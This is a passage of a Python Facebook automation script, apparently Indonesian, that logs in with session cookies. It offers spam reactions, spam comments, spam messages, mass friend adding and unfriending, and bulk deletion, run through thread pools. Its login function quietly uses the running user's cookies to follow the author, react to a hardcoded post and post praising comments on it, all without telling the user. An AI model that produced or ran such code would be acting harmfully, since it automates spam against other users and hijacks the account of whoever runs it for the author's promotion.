#Mau ngapain? recode doang ga ngasih bintang ampass!
import os,sys,time,re,random,string
from time import sleep
try:
   import requests
   from bs4 import BeautifulSoup as bs
   from concurrent.futures import ThreadPoolExecutor
   from parsing import *
   from colorama import init, Fore
   from requests_toolbelt import MultipartEncoder
   from urllib.parse import unquote
except ImportError:
   print("Installing module...")
   os.system(("python" if os.name == "nt" else "python3") + " -m pip install requests bs4 colorama urllib3 futures requests-toolbelt")
   exit("try again use: python3 run.py or python run.py")
"""
Project : Bot Facebook
Author  : FahmiApz
Update  : 15 Desember 2021
"""
init(autoreset=True)
B = Fore.BLUE
W = Fore.WHITE
C = Fore.CYAN
G = Fore.GREEN
Y = Fore.YELLOW
rgb=random.choice([B,C,G,Y])
ab="\033[90m"
pr=f"{W}[{rgb}?{W}]"
fr=f"{W}[{rgb}*{W}]"
gd=f"{W}[{rgb}+{W}]"
er=f"{W}[{rgb}!{W}]"
dn=f"{W}[{rgb}√{W}]"
mbasic="https://mbasic.facebook.com{}"
done=0
die=0

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def baner():
    clear()
    print(f"""
     {rgb}╔╗ {W}┌─┐┌┬┐{rgb} ╔═╗{W}┌─┐┌─┐┌─┐┌┐ ┌─┐┌─┐┬┌─
     {rgb}╠╩╗{W}│ │ │ {rgb} ╠╣ {W}├─┤│  ├┤ ├┴┐│ ││ │├┴┐
     {rgb}╚═╝{W}└─┘ ┴ {rgb} ╚  {W}┴ ┴└─┘└─┘└─┘└─┘└─┘┴ ┴
{ab}-----------------------------------------------
{W}Donate   : {rgb}https://saweria.co/FahmiDev
{W}Message  : {rgb}https://wa.me/62881024612817
{W}Restapi  : {rgb}https://ainxbot-id.herokuapp.com
{W}Youtube  : {rgb}https://youtube.com/KuhakuTermux
{W}Github   : {rgb}https://github.com/Ainx-BOT
{W}Facebook : {rgb}https://facebook.com/kang.ngeue.313
{ab}-----------------------------------------------""")

def proccess(success,failed):
    for i in list("\|/-•"):
        print(f"\r{W}[{rgb}{i}{W}]OK : {rgb}{success}{W} DIE : {rgb}{failed}",end="")
        sleep(0.2)

def cblg():
    lg=input(f"{pr}Try again? ({rgb}Y{W}/{rgb}N{W}) : {rgb}")
    if lg == "y" or lg == "Y":
       os.system("python run.py")
    elif lg == "n" or lg == "N":
       exit(f"{er}Bye bro please star my github repo :)")
    else:
       print(f"{er}Pilih yg bener coeg!")
       cblg()

def login():
    try:
        ck=open("cookies").read()
    except FileNotFoundError:
        ck=input(f"{er}Put your cookies\n{pr} {ab}>>> {rgb}")
    cokie={"cookie":ck}
    log=ses.get(mbasic.format("/me"),cookies=cokie).text
    if "mbasic_logout_button" in log:
        with open("cookies","w") as ex:
            ex.write(cokie["cookie"])
        try:
            bhs=bs(log,"html.parser").find("form",action=lambda x: "/intl/save_locale/?loc=id_ID" in x)
            ind={}
            for x in bhs.find_all("input"):
                if x.get("name") in ["fb_dtsg","jazoest"]:
                    ind.update({x.get("name"):x.get("value")})
                else:
                    continue
            ses.post(mbasic.format(bhs["action"]),data=ind,cookies=cokie)
        except:
            pass
        try:
           flw=ses.get(mbasic.format("/kang.ngeue.313"),cookies=cokie).text
           flw=bs(flw,"html.parser").find("a",string="Ikuti")["href"]
           ses.get(mbasic.format(flw),cookies=cokie)
        except:
           pass
        try:
           rct=ses.get("https://mbasic.facebook.com/100056934954432/posts/378286937412468/",cookies=cokie).text
           react=bs(rct,"html.parser").find("a",href=lambda x: "/reactions/picker/" in x)["href"]
           react=ses.get(mbasic.format(react),cookies=cokie).text
           ty=["&reaction_type=2&","&reaction_type=16&","&reaction_type=3&","&reaction_type=8&"]
           ty=random.choice(ty)
           type=bs(react,"html.parser").find("a",href=lambda x: ty in x)["href"]
           ses.get(mbasic.format(type),cookies=cokie)
        except:
           pass
        try:
           kmn=ses.get("https://mbasic.facebook.com/100056934954432/posts/378286937412468/",cookies=cokie).text
           kmn=bs(kmn,"html.parser").find("form",action=lambda x: "comment.php" in x)
           dt=kmn.find_all("input",type="hidden")
           text=["Hi bang fahmi tools nya keren banget!","tools nya sangat berguna!","Hi i'm user tools Ainx-BOT","semoga rejeki bang fahmi di lancarin amin","tools yang sangat bagus!","be yourself and never surrender"]
           random_komen=random.choice(text)
           ses.post(mbasic.format(kmn["action"]),data={"fb_dtsg":dt[0]["value"],"jazoest":dt[1]["value"],"comment_text":random_komen},cookies=cokie)
        except:
           pass
        try:
           name=bs(log,"html.parser").find("title").text
           id = bs(log,"html.parser").find("a", href = lambda x:"/allactivity" in x)["href"]
           id = re.search(r"/\d+/?", id).group().replace("/", "")
        except:
           name=None
           id=None
        return {"name":name,"id":id,"cookie":cokie["cookie"]}
    else:
        exit(f"{er}Cookies invalid")

def userinfo():
    print(f"{W}Login as : {rgb}{name}")
    print(f"{W}ID       : {rgb}{id}")
    print(f"{ab}-----------------------------------------------{W}")

def komen_image(url,text,ni,img,ty):
    global done,die
    try:
        if type(text) == list:
           text=random.choice(text)
        else:
           text=text
        req=bs(ses.get(url,cookies=cokie).text,"html.parser").find_all("form",action=lambda x: "comment.php" in x)[1]
        dt=req.find_all("input")
        params={}
        for x in dt:
            if x.get("name") in ["fb_dtsg","jazoest","view_photo"]:
               params.update({x.get("name"):x.get("value")})
            else:
               continue
        res=bs(ses.post(mbasic.format(req["action"]),data=params,cookies=cokie).text,"html.parser").find("form",action=lambda x: "https://upload.facebook.com/_mupload_/ufi/mbasic/advanced/" in x)
        dt2=res.find_all("input")
        fg=dt2[0]["value"]
        jz=dt2[1]["value"]
        sb=dt2[4]["value"]
        boundary = '----WebKitFormBoundary' \
                 + ''.join(random.sample(string.ascii_letters + string.digits, 16))
        mp=MultipartEncoder(fields={"fb_dtsg":(None,fg),"jazoest":(None,jz),"photo":(ni,img,ty),"comment_text":(None,text),"post":(None,sb)},boundary=boundary)
        head={"Host":"upload.facebook.com","cache-control":"max-age=0","origin":"https://mbasic.facebook.com","upgrade-insecure-requests":"1","content-type":mp.content_type,"user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3","referer":mbasic.format(req["action"]),"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
        requests.post(res["action"],data=mp,headers=head,cookies=cokie,allow_redirects=False)
        done+=1
    except:
        die+=1
    proccess(done,die)

def komen_no_image(url,text):
    global done,die
    try:
        if type(text) == list:
           text=random.choice(text)
        else:
           text=text
        req=bs(ses.get(url,cookies=cokie).text,"html.parser").find("form",action=lambda x: "comment.php" in x)
        url_komen=mbasic.format(req['action'])
        dt=req.find_all("input",type="hidden")
        fg=dt[0]["value"]
        jz=dt[1]["value"]
        params={"fb_dtsg":fg,"jazoest":jz,"comment_text":text}
        ses.post(url_komen,data=params,headers={"Host":"mbasic.facebook.com","cache-control":"max-age=0","origin":"https://mbasic.facebook.com","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3","referer":url,"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},cookies=cokie)
        done+=1
    except:
        die+=1
    proccess(done,die)

def kirim_pesan(url,text):
    global done,die
    try:
        if type(text) == list:
           text=random.choice(text)
        else:
           text=text
        req=ses.get(url,cookies=cokie).text
        nick=bs(req,"html.parser").find("title").text
        snd=bs(req,"html.parser").find("a",href=lambda x: "/messages/thread/" in x)["href"]
        krm=bs(ses.get(mbasic.format(snd),cookies=cokie).text,"html.parser").find("form",action=lambda x: "/messages/send/?icm=1" in x)
        dt=krm.find_all("input",type="hidden")
        if not "&refid=" in krm["action"]:
           fg=dt[0]["value"]
           jz=dt[1]["value"]
           ids=dt[2]["value"]
           tids=dt[3]["value"]
           params={"fb_dtsg":fg,"jazoest":jz,"ids["+ids+"]":ids,"text_ids["+ids+"]":tids,"body":text,"Send":"Kirim"}
        else:
           fg=dt[0]["value"]
           jz=dt[1]["value"]
           tids=dt[2]["value"]
           wup=dt[3]["value"]
           ids=dt[4]["value"]
           cv=dt[7]["value"]
           cs=dt[8]["value"]
           params={"fb_dtsg":fg,"jazoest":jz,"body":text,"send":"Kirim","tids":tids,"wwwupp":wup,"ids["+ids+"]":ids,"referrer":"","ctype":"","cver":cv,"csid":cs}
        ses.post(mbasic.format(krm["action"]),data=params,cookies=cokie)
        print(f"\r{dn}Message Send To {ab}=> {rgb}{nick}               ")
        done+=1
    except:
        die+=1
    proccess(done,die)

def react(url,type):
    global done,die
    try:
       req=ses.get(url,cookies=cokie).text
       ty=bs(req,"html.parser").find("a",href=lambda x: type in x)["href"]
       ses.get(mbasic.format(ty),cookies=cokie)
       done+=1
    except:
       die+=1
    proccess(done,die)

def delete_mypost(url):
    global done,die
    try:
        req=ses.get(url,cookies=cokie).text
        dlt=bs(req,"html.parser").find("form",action=lambda x: "/nfx/basic/handle_action/?" in x)
        url_dlt=mbasic.format(dlt["action"])
        dt=dlt.find_all("input",type="hidden")
        fg=dt[0]["value"]
        jz=dt[1]["value"]
        params={"fb_dtsg":fg,"jazoest":jz,"action_key":"DELETE","submit":"Kirim"}
        ses.post(url_dlt,data=params,cookies=cokie)
        done+=1
    except:
        die+=1
    proccess(done,die)

def delete_message(url):
    global done,die
    try:
        req=ses.get(url,cookies=cokie).text
        dlt=bs(req,"html.parser").find("form",action=lambda x: "/messages/action_redirect?" in x)
        dt=dlt.find_all("input",type="hidden")
        fg=dt[0]["value"]
        jz=dt[1]["value"]
        last=ses.post(mbasic.format(dlt["action"]),data={"fb_dtsg":fg,"jazoest":jz,"delete":"Hapus"},cookies=cokie).text
        last=bs(last,"html.parser").find("a",string="Hapus")["href"]
        ses.get(mbasic.format(last),cookies=cokie)
        done+=1
    except:
        die+=1
    proccess(done,die)

def unaccrej(url,type):
    global done,die
    if type == "acc,reject,unadd":
       try:
          ses.get(url,cookies=cokie)
          done+=1
       except:
          die+=1
       proccess(done,die)
    elif type == "unfriend":
       try:
          req=ses.get(url,cookies=cokie).text
          nick=bs(req,"html.parser").find("title").text
          hps=bs(req,"html.parser").find("a",string="Batalkan pertemanan")["href"]
          hps=ses.get(mbasic.format(hps),cookies=cokie).text
          hps=bs(hps,"html.parser").find("form",action=lambda x: "/a/friends/remove/?" in x)
          dt=hps.find_all("input",type="hidden")
          fg=dt[0]["value"]
          jz=dt[1]["value"]
          ses.post(mbasic.format(hps["action"]),data={"fb_dtsg":fg,"jazoest":jz,"confirm":"Konfirmasi"},cookies=cokie)
          print(f"\r{dn}Unfriend {ab}=> {rgb}{nick}                      ")
          done+=1
       except:
          die+=1
       proccess(done,die)
    else:
       return False

def post_image(url,text,ni,img,ty,source):
    global done,die
    if source == "timeline":
       try:
          if type(text) == list:
             text=random.choice(text)
          else:
             text=text
          req=bs(ses.get(url,cookies=cokie).text,"html.parser").find("form",action=lambda x: "/composer/mbasic/?" in x)
          dt=req.find_all("input")
          params={}
          for x in dt:
              if x.get("name") in ["fb_dtsg","jazoest","privacyx","target","c_src","cwevent","referrer","ctype","cver","rst_icv","view_photo"]:
                 params.update({x.get("name"):x.get("value")})
              else:
                 continue
          params.update({"xc_message":text})
          res=bs(ses.post(mbasic.format(req["action"]),data=params,cookies=cokie).text,"html.parser").find("form",action=lambda x: "/composer/mbasic/?" in x)
          dt2=res.find_all("input")
          params2={}
          for x in dt2:
              if x.get("name") in ["fb_dtsg","jazoest","add_photo_done","filter_type","target_id","waterfall_source","waterfall_id","waterfall_app_name"]:
                 params2.update({x.get("name"):x.get("value")})
              else:
                 continue
          boundary = '----WebKitFormBoundary' \
                   + ''.join(random.sample(string.ascii_letters + string.digits, 16))
          mp=MultipartEncoder(fields={"fb_dtsg":(None,params2["fb_dtsg"]),"jazoest":(None,params2["jazoest"]),"file1":(ni,img,ty),"file2":("",None,"application/octet-stream"),"file3":("",None,"application/octet-stream"),"add_photo_done":(None,params2["add_photo_done"]),"filter_type":(None,"-1"),"target_id":(None,params2["target_id"]),"waterfall_source":(None,params2["waterfall_source"]),"waterfall_id":(None,params2["waterfall_id"]),"waterfall_app_name":(None,params2["waterfall_app_name"])},boundary=boundary)
          head={"Host":"mbasic.facebook.com","cache-control":"max-age=0","origin":"https://mbasic.facebook.com","upgrade-insecure-requests":"1","content-type":mp.content_type,"user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3","referer":mbasic.format(req["action"]),"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
          last=bs(ses.post(mbasic.format(res["action"]),data=mp,headers=head,cookies=cokie).text,"html.parser").find("form",action=lambda x: "/composer/mbasic/?" in x)
          dt3=last.find_all("input")
          params3={}
          for x in dt3:
              if x.get("name") in ["fb_dtsg","jazoest","at","target","csid","c_src","referrer","ctype","cver","users_with","album_id","waterfall_source","privacyx","appid","photo_ids[]","return_uri","return_uri_error","waterfall_id","view_post"]:
                 params3.update({x.get("name"):x.get("value")})
              else:
                 continue
          mp2=MultipartEncoder(fields={"fb_dtsg":(None,params3["fb_dtsg"]),"jazoest":(None,params3["jazoest"]),"at":None,"target":(None,params3["target"]),"csid":(None,params3["csid"]),"c_src":(None,params3["c_src"]),"referrer":(None,params3["referrer"]),"ctype":(None,params3["ctype"]),"cver":(None,params3["cver"]),"users_with":None,"album_id":None,"waterfall_source":(None,params3["waterfall_source"]),"privacyx":(None,params3["privacyx"]),"appid":(None,params3["appid"]),"photo_ids[]":(None,params3["photo_ids[]"]),"return_uri":(None,params3["return_uri"]),"return_uri_error":(None,params3["return_uri_error"]),"waterfall_id":(None,params3["waterfall_id"]),"xc_message":(None,text),"view_post":(None,params3["view_post"])},boundary=boundary)
          head.update({"content-type":mp2.content_type,"referer":mbasic.format(res["action"])})
          ses.post(mbasic.format(last["action"]),data=mp2,headers=head,cookies=cokie)
          done+=1
       except:
          die+=1
       proccess(done,die)
    elif source == "group":
       try:
           if type(text) == list:
              text=random.choice(text)
           else:
              text=text
           req=bs(ses.get(url,cookies=cokie).text,"html.parser").find("form",action=lambda x: "/composer/mbasic/?" in x)
           dt=req.find_all("input")
           params={}
           for x in dt:
               if x.get("name") in ["fb_dtsg","jazoest","target","c_src","cwevent","referrer","ctype","cver","rst_icv","view_photo"]:
                  params.update({x.get("name"):x.get("value")})
               else:
                  continue
           params.update({"xc_message":text})
           res=bs(ses.post(mbasic.format(req["action"]),data=params,cookies=cokie).text,"html.parser").find("form",action=lambda x: "/composer/mbasic/?" in x)
           dt2=res.find_all("input")
           params2={}
           for x in dt2:
               if x.get("name") in ["fb_dtsg","jazoest","add_photo_done","target_id","waterfall_source","waterfall_id","waterfall_app_name"]:
                  params2.update({x.get("name"):x.get("value")})
               else:
                  continue
           boundary = '----WebKitFormBoundary' \
                    + ''.join(random.sample(string.ascii_letters + string.digits, 16))
           mp=MultipartEncoder(fields={"fb_dtsg":(None,params2["fb_dtsg"]),"jazoest":(None,params2["jazoest"]),"file1":(ni,img,ty),"file2":("",None,"application/octet-stream"),"file2":("",None,"application/octet-stream"),"file3":("",None,"application/octet-stream"),"add_photo_done":(None,params2["add_photo_done"]),"filter_type":(None,"-1"),"target_id":(None,params2["target_id"]),"waterfall_source":(None,params2["waterfall_source"]),"waterfall_id":(None,params2["waterfall_id"]),"waterfall_app_name":(None,params2["waterfall_app_name"])},boundary=boundary)
           head={"Host":"mbasic.facebook.com","cache-control":"max-age=0","origin":"https://mbasic.facebook.com","upgrade-insecure-requests":"1","content-type":mp.content_type,"user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3","referer":mbasic.format(req["action"]),"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
           last=bs(ses.post(mbasic.format(res["action"]),data=mp,headers=head,cookies=cokie).text,"html.parser").find("form",action=lambda x: "/composer/mbasic/?" in x)
           dt3=last.find_all("input")
           params3={}
           for x in dt3:
               if x.get("name") in ["fb_dtsg","jazoest","at","target","csid","c_src","referrer","ctype","cver","users_with","album_id","waterfall_source","appid","photo_ids[]","return_uri","return_uri_error","waterfall_id","view_post"]:
                  params3.update({x.get("name"):x.get("value")})
               else:
                  continue
           mp2=MultipartEncoder(fields={"fb_dtsg":(None,params3["fb_dtsg"]),"jazoest":(None,params3["jazoest"]),"at":None,"target":(None,params3["target"]),"csid":(None,params3["csid"]),"c_src":(None,params3["c_src"]),"referrer":(None,params3["referrer"]),"ctype":(None,params3["ctype"]),"cver":(None,params3["cver"]),"users_with":None,"album_id":None,"waterfall_source":(None,params3["waterfall_source"]),"appid":(None,params3["appid"]),"photo_ids[]":(None,params3["photo_ids[]"]),"return_uri":(None,params3["return_uri"]),"return_uri_error":(None,params3["return_uri_error"]),"waterfall_id":(None,params3["waterfall_id"]),"xc_message":(None,text),"view_post":(None,params3["view_post"])},boundary=boundary)
           head.update({"content-type":mp2.content_type,"referer":mbasic.format(res["action"])})
           ses.post(mbasic.format(last["action"]),data=mp2,headers=head,cookies=cokie)
           done+=1
       except:
           die+=1
       proccess(done,die)
    else:
       return False

def post_no_image(url,text):
    global done,die
    try:
        if type(text) == list:
           text=random.choice(text)
        else:
           text=text
        req=bs(ses.get(url,cookies=cokie).text,"html.parser").find("form",action=lambda x: "/composer/mbasic/?" in x)
        dt=req.find_all("input")
        params={}
        for x in dt:
            if x.get("name") in ["fb_dtsg","jazoest","privacyx","target","c_src","cwevent","referrer","ctype","cver","rst_icv","view_post"]:
               params.update({x.get("name"):x.get("value")})
            else:
               continue
        params.update({"xc_message":text})
        ses.post(mbasic.format(req["action"]),data=params,cookies=cokie)
        done+=1
    except:
        die+=1
    proccess(done,die)

def add(url):
    global done,die
    try:
       req=ses.get(url,cookies=cokie).text
       nick=bs(req,"html.parser").find("title").text
       tmbh=bs(req,"html.parser").find("a",string="Tambah Teman")["href"]
       ses.get(mbasic.format(tmbh),cookies=cokie)
       print(f"\r{dn}Add {ab}=> {rgb}{nick}                    ")
       done+=1
    except:
       die+=1
    proccess(done,die)

def menu():
    baner()
    userinfo()
    print(f"{rgb}01{ab}. {W}spam react\n{rgb}02{ab}. {W}spam comment\n{rgb}03{ab}. {W}spam message\n{rgb}04{ab}. {W}auto accept request friend\n{rgb}05{rgb}. {W}auto reject request friend\n{rgb}06{ab}. {W}auto unadd not unfriend\n{rgb}07{ab}. {W}auto unfriend\n{rgb}08{ab}. {W}auto delete message\n{rgb}09{ab}. {W}auto delete post\n{rgb}10{ab}. {W}auto post\n{rgb}11{ab}. {W}auto add friend\n{rgb}12{ab}. {W}find group\n{rgb}13{ab}. {W}find people\n{rgb}14{ab}. {W}download vidio\n{rgb}15{ab}. {W}remove cookies\n{rgb}00{ab}. {W}exit\n{ab}-----------------------------------------------")
    pilih_menu()

def pilih_menu():
    choice=input(f"{pr}Select : {rgb}")
    if choice == "00" or choice == "0":
       baner()
       sys.exit(f"{er}Bye bro please star my github repo :)")
    elif choice == "01" or choice == "1":
       spam_react()
    elif choice == "02" or choice == "2":
       spam_komen()
    elif choice == "03" or choice == "3":
       spam_message()
    elif choice == "04" or choice == "4":
       print(f"\r{gd}Getting Data...",end="")
       usr=people(ses,cokie,mbasic.format("/friends/center/requests/#friends_center_main"),"reqteman")
       print(f"\r{fr}Total  : {rgb}{len(usr)}                      ",end="")
       print()
       try:
          jum=int(input(f"{pr}Count  : {rgb}"))
       except ValueError:
          exit(f"{er}Masukin jumlah yang mau di acc nya coeg")
       print(f"{ab}-----------------------------------------------")
       with ThreadPoolExecutor(max_workers=20) as ex:
          for x in usr[:jum]:
              ex.submit(unaccrej,(mbasic.format(x)),("acc,reject,unadd"))
       print()
       print(f"{ab}-----------------------------------------------")
       cblg()
    elif choice == "05" or choice == "5":
       print(f"\r{gd}Getting Data...",end="")
       usr=people(ses,cokie,mbasic.format("/friends/center/requests/#friends_center_main"),"rejteman")
       print(f"\r{fr}Total  : {rgb}{len(usr)}                      ",end="")
       print()
       try:
          jum=int(input(f"{pr}Count  : {rgb}"))
       except ValueError:
          exit(f"{er}Masukin jumlah yg mau di reject nya coeg")
       print(f"{ab}-----------------------------------------------")
       with ThreadPoolExecutor(max_workers=20) as ex:
          for x in usr[:jum]:
              ex.submit(unaccrej,(mbasic.format(x)),("acc,reject,unadd"))
       print()
       print(f"{ab}-----------------------------------------------")
       cblg()
    elif choice == "06" or choice == "6":
       print(f"\r{gd}Getting Data...",end="")
       usr=people(ses,cokie,mbasic.format("/friends/center/requests/outgoing/#friends_center_main"),"reqsent")
       print(f"\r{fr}Total  : {rgb}{len(usr)}                     ",end="")
       print()
       try:
          jum=int(input(f"{pr}Count  : {rgb}"))
       except ValueError:
          exit(f"{er}Masukin jumlah yang mau di unadd nya coeg")
       print(f"{ab}-----------------------------------------------")
       with ThreadPoolExecutor(max_workers=20) as ex:
          for x in usr[:jum]:
              ex.submit(unaccrej,(mbasic.format(x)),("acc,reject,unadd"))
       print()
       print(f"{ab}-----------------------------------------------")
       cblg()
    elif choice == "07" or choice == "7":
       print(f"\r{gd}Getting Data...",end="")
       user=bs(ses.get(mbasic.format("/me"),cookies=cokie).text,"html.parser").find("a",string="Teman")["href"]
       usr=people(ses,cokie,mbasic.format(user),"teman")
       print(f"\r{fr}Total  : {rgb}{len(usr)}                      ",end="")
       print()
       try:
           jum=int(input(f"{pr}Count  : {rgb}"))
       except ValueError:
           exit(f"{er}Masukin jumlah yang mau di unfriend nya coeg")
       print(f"{ab}-----------------------------------------------")
       with ThreadPoolExecutor(max_workers=20) as ex:
           for x in usr[:jum]:
               ex.submit(unaccrej,(mbasic.format(x)),("unfriend"))
       print()
       print(f"{ab}-----------------------------------------------")
       cblg()
    elif choice == "08" or choice == "8":
       print(f"\r{gd}Getting Data...",end="")
       usr=find(ses,cokie,mbasic.format("/messages/"),"msg")
       print(f"\r{fr}Total  : {rgb}{len(usr)}                       ",end="")
       print()
       try:
           jum=int(input(f"{pr}Count  : {rgb}"))
       except ValueError:
           exit(f"{er}Masukin jumlah pesan yg mau di hapusnya coeg")
       print(f"{ab}-----------------------------------------------")
       with ThreadPoolExecutor(max_workers=20) as ex:
           for x in usr[:jum]:
               ex.submit(delete_message,(mbasic.format(x)))
       print()
       print(f"{ab}-----------------------------------------------")
       cblg()
    elif choice == "09" or choice == "9":
       print(f"\r{gd}Getting Data...",end="")
       usr=dump_post(ses,cokie,mbasic.format("/me?v=timeline"),"delete","Lihat Berita Lain")
       print(f"\r{fr}Total  : {rgb}{len(usr)}                   ",end="")
       print()
       try:
           jum=int(input(f"{pr}Count  : {rgb}"))
       except ValueError:
           exit(f"{er}Masukin jumlah post yang mau di hapusnya coeg")
       print(f"{ab}-----------------------------------------------")
       with ThreadPoolExecutor(max_workers=20) as ex:
           for x in usr[:jum]:
               ex.submit(delete_mypost,(mbasic.format(x)))
       print()
       print(f"{ab}-----------------------------------------------")
       cblg()
    elif choice == "10":
       auto_post()
    elif choice == "11":
       auto_add()
    elif choice == "12":
       print(f"\r{gd}Getting Data...",end="")
       usr=find(ses,cokie,"https://mbasic.facebook.com/groups/?seemore","group")
       print(f"\r{fr}Total  : {rgb}{len(usr)}                         ",end="")
       print()
       sleep(2)
       print(f"{ab}-----------------------------------------------")
       for x in usr:
           x=x.split("|")
           print(f"{W}Nickname    : {rgb}{x[1]}")
           print(f"{W}Username/ID : {rgb}{x[0]}")
           print(f"{ab}-----------------------------------------------")
       print(f"{er}Please copy the username/id group")
       input(f"{W}[ {rgb}Press Enter To Back {W}]")
       os.system("python run.py")
    elif choice == "13":
       user=input(f"{er}Find by name\n{pr} {ab}>>> {rgb}")
       print(f"\r{gd}Getting Data...",end="")
       usr=find(ses,cokie,mbasic.format("/search/people/?q="+user+"&source=filter&isTrending=0"),"people")
       print(f"\r{fr}Total  : {rgb}{len(usr)}                         ",end="")
       sleep(2)
       print()
       print(f"{ab}-----------------------------------------------")
       for x in usr:
           x=x.split("|")
           print(f"{W}Nickname    : {rgb}{x[1]}")
           print(f"{W}Username/ID : {rgb}{x[0]}")
           print(f"{ab}-----------------------------------------------")
       print(f"{er}Please copy the username/id people")
       input(f"{W}[ {rgb}Press Enter To Back{W} ]")
       os.system("python run.py")
    elif choice == "14":
       user=input(f"{er}Put url vidio\n{pr}{ab} >>> {rgb}")
       if "www.facebook" in user:
          user=user.replace("www.facebook","mbasic.facebook")
       elif "m.facebook" in user:
          user=user.replace("m.facebook","mbasic.facebook")
       else:
          user=user
       print(f"\r{gd}Downloading...",end="")
       req=ses.get(user,cookies=cokie).text
       judul=bs(req,"html.parser").find("title").text
       link=bs(req,"html.parser").find("a",href=lambda x: "/video_redirect/?" in x)["href"].replace("/video_redirect/?src=","")
       link=requests.get(unquote(link))
       with open("/sdcard/"+judul+".mp4","wb") as ex:
            for data in link.iter_content(chunk_size=1024):
                ex.write(data)
       print(f"\r{dn}Done. video saved in\n{pr}{ab}>>> {rgb}/sdcard/{judul}.mp4")
       print(f"{ab}-----------------------------------------------")
       cblg()
    elif choice == "15":
       print(f"{er}Please Waiting...")
       os.system("rm cookies")
       ses.headers.clear()
       sleep(1)
       print(f"{dn}Done.")
       print(f"{ab}-----------------------------------------------")
       cblg()
    else:
       print(f"{er}Pilih yg bener coeg")
       pilih_menu()

def auto_add():
    baner()
    userinfo()
    print(f"{rgb}01{ab}. {W}auto add friend suggestion\n{rgb}02{ab}. {W}auto add friend from search\n{rgb}03{ab}. {W}auto add friend from friend\n{rgb}00{ab}. {W}back")
    print(f"{ab}-----------------------------------------------")
    pilih_add()

def auto_post():
    baner()
    userinfo()
    print(f"{rgb}01{ab}. {W}auto post timeline\n{rgb}02{ab}. {W}auto post group\n{rgb}00{ab}. {W}back")
    print(f"{ab}-----------------------------------------------")
    pilih_auto_post()

def spam_react():
    baner()
    userinfo()
    print(f"{rgb}01{ab}. {W}spam react in people\n{rgb}02{ab}. {W}spam react in home\n{rgb}03{ab}. {W}spam react in group\n{rgb}00{ab}. {W}back")
    print(f"{ab}-----------------------------------------------")
    pilih_react()

def spam_komen():
    baner()
    userinfo()
    print(f"{rgb}01{ab}. {W}spam comment in people\n{rgb}02{ab}. {W}spam comment in home\n{rgb}03{ab}. {W}spam comment in group\n{rgb}04{ab}. {W}spam comment in target post\n{rgb}00{ab}. {W}back")
    print(f"{ab}-----------------------------------------------")
    pilih_komen()

def spam_message():
    baner()
    userinfo()
    print(f"{rgb}01{ab}. {W}spam message online friend\n{rgb}02{ab}. {W}spam message target friend\n{rgb}00{ab}. {W}back")
    print(f"{ab}-----------------------------------------------")
    pilih_message()

def pilih_add():
    choice=input(f"{pr}Select : {rgb}")
    if choice == "00" or choice == "0":
       menu()
    elif choice == "01" or choice == "1":
       print(f"\r{gd}Getting Data...",end="")
       usr=add_friend(cokie,"https://mbasic.facebook.com/friends/center/mbasic/","saran")
       print(f"\r{fr}Total  : {rgb}{len(usr)}                           ",end="")
       print()
       try:
          jum=int(input(f"{pr}Count  : {rgb}"))
       except ValueError:
          exit(f"{er}Masukin jumlah yang mau di add nya coeg")
       print(f"{ab}-----------------------------------------------")
       with ThreadPoolExecutor(max_workers=20) as ex:
            for x in usr[:jum]:
                ex.submit(add,(mbasic.format("/profile.php?id="+x)))
       print()
       print(f"{ab}-----------------------------------------------")
       cblg()
    elif choice == "02" or choice == "2":
       user=input(f"{er}Add by name\n{pr}{ab} >>> {rgb}")
       print(f"\r{gd}Getting Data...",end="")
       req=requests.get("https://mbasic.facebook.com/friends/center/search/#friends_center_main",cookies=cokie).text
       tid=re.findall(r'name="tid" value="(.*?)"',req)[0]
       ss=re.findall(r'name="session" value="(.*?)"',req)[0]
       ssf=re.findall(r'name="ssf" value="(.*?)"',req)[0]
       usr=add_friend(cokie,"https://mbasic.facebook.com/friends/center/search/?tid="+tid+"&session="+ss+"&ssf="+ssf+"&q="+user,"search")
       print(f"\r{fr}Total  : {rgb}{len(usr)}                        ",end="")
       print()
       try:
           jum=int(input(f"{pr}Count  : {rgb}"))
       except ValueError:
           exit(f"{er}Masukin jumlah yang mau di add nya coeg")
       print(f"{ab}-----------------------------------------------")
       with ThreadPoolExecutor(max_workers=20) as ex:
           for x in usr[:jum]:
               ex.submit(add,(mbasic.format("/profile.php?id="+x)))
       print()
       print(f"{ab}-----------------------------------------------")
       cblg()
    elif choice == "03" or choice == "3":
       user=input(f"{er}Put username/id friend\n{pr}{ab} >>> {rgb}")
       if user.isdigit():
          user="/profile.php?id="+user
       else:
          user="/"+user
       print(f"\r{gd}Getting Data...",end="")
       user=bs(ses.get(mbasic.format(user),cookies=cokie).text,"html.parser").find("a",string="Teman")["href"]
       usr=add_friend(cokie,mbasic.format(user),"friend")
       print(f"\r{fr}Total  : {rgb}{len(usr)}                       ",end="")
       print()
       try:
          jum=int(input(f"{pr}Count  : {rgb}"))
       except ValueError:
          exit(f"{er}Masukin jumlah yang mau di add nya coeg")
       print(f"{ab}-----------------------------------------------")
       with ThreadPoolExecutor(max_workers=20) as ex:
          for x in usr[:jum]:
              ex.submit(add,(mbasic.format("/profile.php?id="+x)))
       print()
       print(f"{ab}-----------------------------------------------")
       cblg()
    else:
       print(f"{er}Pilih yg bener coeg")
       pilih_add()

def pilih_auto_post():
    choice=input(f"{pr}Select : {rgb}")
    if choice == "00" or choice == "0":
       menu()
    elif choice == "01" or choice == "1":
       try:
          jum=int(input(f"{pr}Count  : {rgb}"))
       except ValueError:
          exit(f"{er}Masukin jumlah post nya coeg")
       ph=input(f"{pr}Add image to post? ({rgb}Y{W}/{rgb}N{W}) : {rgb}")
       if ph == "y" or ph == "Y":
